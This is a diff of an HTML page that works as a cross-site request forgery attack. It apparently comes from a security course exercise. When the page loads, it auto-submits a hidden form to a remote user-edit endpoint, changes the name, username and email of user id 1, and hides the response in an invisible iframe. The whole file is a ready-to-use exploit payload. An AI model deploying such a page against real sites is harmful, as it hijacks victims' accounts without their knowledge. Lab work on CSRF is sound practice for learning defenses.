@@ -1,9 +1,22 @@
 <html>
 <body onload="document.csrfForm.submit()">
-	<img src="https://cdn.pixabay.com/photo/2019/07/30/05/53/dog-4372036_960_720.jpg" />
-    	<form action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST" name="csrfForm" style="display: none;" target="hidden_results">
-      		<input type="text" name="userId" value="215384da730e7b0e4be041902bffa9bc421b831a">
+	<!-- <form action="https://104.198.208.81/blue/public/staff/users/edit.php?id=1" method="POST" name="csrfForm" style="display: none;" target="hidden_results">
+		<input name="first_name" value="Jum"></input>
+		<input name="Submit" value="Update"></input>
+	</form> -->
+
+	<form action="https://104.198.208.81/red/public/staff/users/edit.php?id=1" method="POST" name="csrfForm" style="display: none;" target="hidden_results" >
+		<!-- <input type="hidden" name="csrf_token" value="jasdifasdoivasdiovjasasdfasd">     -->
+		<input type="text" name="first_name" value="Jam">
+		<input type="text" name="last_name" value="Munroe">
+		<input type="text" name="username" value="jmonroe99">
+		<input type="text" name="email" value="test@test.com">
+		<!-- <input type="password" name="previous_password" value="">
+		<input type="password" name="password" value="">
+		<input type="password" name="confirm_password" value=""> -->
+		<input name="Submit" value="Update">
 	</form>
-    	<iframe name="hidden_results" style="display:none;" />
+
+	<iframe name="hidden_results" style="display:none;" >
 </body>
 </html>
